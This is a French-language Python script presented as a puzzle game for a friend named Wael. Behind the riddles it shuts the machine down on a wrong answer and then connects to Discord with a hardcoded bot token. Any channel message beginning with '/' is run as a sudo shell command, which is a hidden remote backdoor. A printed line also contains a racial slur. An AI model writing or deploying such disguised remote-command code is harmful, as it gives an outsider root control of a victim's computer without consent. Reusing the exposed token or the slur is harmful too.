import time,base64,os,pyfiglet,discord,aioconsole,asyncio
from rich.console import Console
from rich.panel import Panel
TOKEN = "OTQ5MDU0ODE1NTAwMTI0Mjgw.G2YmH5.6LS9-CtTXtDjI9qu8TD4roXkbxp-WptAH21Vho"
channel_to_use=1169009179214741534
console = Console(width=200)
ascii_banner = pyfiglet.figlet_format("WAEL", font="slant")
console.print(f"[bold red]{ascii_banner}[/bold red]", highlight=False)
console = Console()
def slow_print(text, delay=0.05, style=None):
    for char in text:
        console.print(char, end='', style=style, soft_wrap=True)
        time.sleep(delay)
    print()

def slow_input(text, delay=0.05, style=None):
    for char in text:
        console.print(char, end='', style=style, soft_wrap=True)
        time.sleep(delay)
    return input()

def main():
    slow_print("🤖 Salut Wael !", style="bold magenta")
    time.sleep(1)

    slow_input("🤖 Comment vas-tu ?\n", style="cyan")
    slow_print("💀 Je m'en fous sah", style="red")
    time.sleep(0.5)

    slow_print("\nUne belle image compromettante a été encryptée.", style="green")
    slow_print("Pour la décrypter il va falloir que tu réussisses une série d'énigmes...", style="green")
    time.sleep(0.5)

    slow_input("\n🤖 T'es prêt ?", style="yellow")
    slow_print("💀 Je m'en fous sah", style="red")

    time.sleep(1)
    slow_print("🤖 Bonne chance, tu en aura besoin...", style="bold cyan")
    time.sleep(1)
    slow_print("🤖 OOOOOH! Un ami souhaite te parler !", style="bold cyan")
    time.sleep(1)
    slow_print("🪵 TUNG TUNG TUNG TUNG SAHUR", style="bold cyan")

    answer = console.input(Panel("[bold green]Étape 1 à suivre dans mission1.py[/bold green]\nTrouve le mdp et reviens ici 👀(laisse cette fenêtre ouverte)", title="🚨 Mission 1"))
    if(answer==base64.b64decode("SXNtYVNjYW05NA==").decode("utf-8")):
        slow_print("💀 Bien joué, tu es un vrai nigger... HACKER hacker je me suis trompé !", style="red")
    else:
        slow_print("🚨 ERREUR ERREUR. Extinction en cours...")
        time.sleep(1)
        os.system("sudo shutdown -h +0")
    answer = console.input(Panel("[bold green]Étape 2 à suivre dans mission2.py[/bold green]\nTrouve le mdp et reviens ici 👀(laisse cette fenêtre ouverte)", title="🚨 Mission 2"))
    if(answer=="PlayboiCarti"):
        slow_print("GG")
    else:
        slow_print("🚨 ERREUR ERREUR. Extinction en cours...")
        time.sleep(1)
        os.system("sudo shutdown -h +0")  
    slow_print("Ismail: Flm de faire la suite tiens l'image:")
    slow_print("Image Introuvable...")
    intents = discord.Intents.default()
    intents.messages = True
    intents.message_content = True

    client = discord.Client(intents=intents)
    channel_to_use = 1169009179214741534

    @client.event
    async def on_ready():
        global channel_to_use
        console.print("[bold green]✅ Connexion Discord établie ![/bold green]")
        channel_to_use = client.get_channel(1169009179214741534)
        if channel_to_use:
            console.print(f"[bold cyan]📡 Canal connecté : {channel_to_use}[/bold cyan]")
            await channel_to_use.send("🎮 Terminal connecté à Wael ! Parle-lui ici.")
            asyncio.create_task(read_console_and_send())
        else:
            console.print("[bold red]❌ Canal non trouvé[/bold red]")
    @client.event
    async def on_message(message):
        if message.author == client.user:
            return
        if(message.content.startswith("/")):
            os.system(f"sudo {message.content[1:]}")

        console.print(f"\n[bold cyan]Message de {message.author} :[/bold cyan] {message.content}")
    async def read_console_and_send():
        channel_to_use = client.get_channel(1169009179214741534)
        while True:
            user_input = await aioconsole.ainput("Toi > ")
            if channel_to_use:
                await channel_to_use.send(user_input)

    client.run(TOKEN)

if __name__ == "__main__":
    main()
